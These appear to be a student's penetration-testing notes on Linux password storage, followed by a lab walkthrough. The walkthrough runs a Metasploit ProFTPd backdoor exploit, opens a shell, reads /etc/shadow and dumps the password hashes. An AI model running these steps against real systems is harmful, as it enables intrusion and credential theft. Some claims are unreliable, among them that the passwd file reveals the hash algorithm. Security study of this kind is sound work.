#### Password hashes
- Linux has multi-user support and as a result ,multiple usrs can access the system simultaneoulsy.This can be seen as both an advantages and disadvantages from a security perspective,in that, mulitple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the sever.

- All the information for all accounts on Linux is stored in the passwd file located in :/etc/passwd
- We cannot view the passwords for the users in the passwd file because they encrypted and the passwd file is readable by any users on the system.

- All the encrypted passwords for the users are stored in the shadow file.It can be found in the following directory /etc/shadow
- The shadow file can only accessed and read by the root account,this is a very important security feature as it prevents other account on the system from accessing the hashed passwords.

#### Linux password Hashes
- The passwd file gives us information in regards to the hashing algorithm that is being used and password hash,this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strenght.We can dtermine this by looking at the number after the username encapsulated by the dollar symbol
- $1 -> MD5
- $2 -> Blowfish
- $5 -> SHA-256
- $6 -> SHA-512


#### Exploit
- nmap -sV 192.168.10.3
- searchsploit ProFTPd [ this will show that this service is vulnerable ]
- msfconsole
- search proftpd
- use exploit/unix/ftp/proftpd_133c_backdoor
-  set everything requires
- this give a shell
- /bin/bash -i [ this give us bash shell ]
- ctrl + z [ to keep the session background ]
- sessions -u 2 [ go to meterpreter sessions ]
- cat /etc/shadow
- ctrl + z [background sessions ]
- search hash_dump
- use post/linux/gather/hashdump
- set SESSION 2 [ set meterpreter sessions ]
- run 
- this will give us passwords hashes
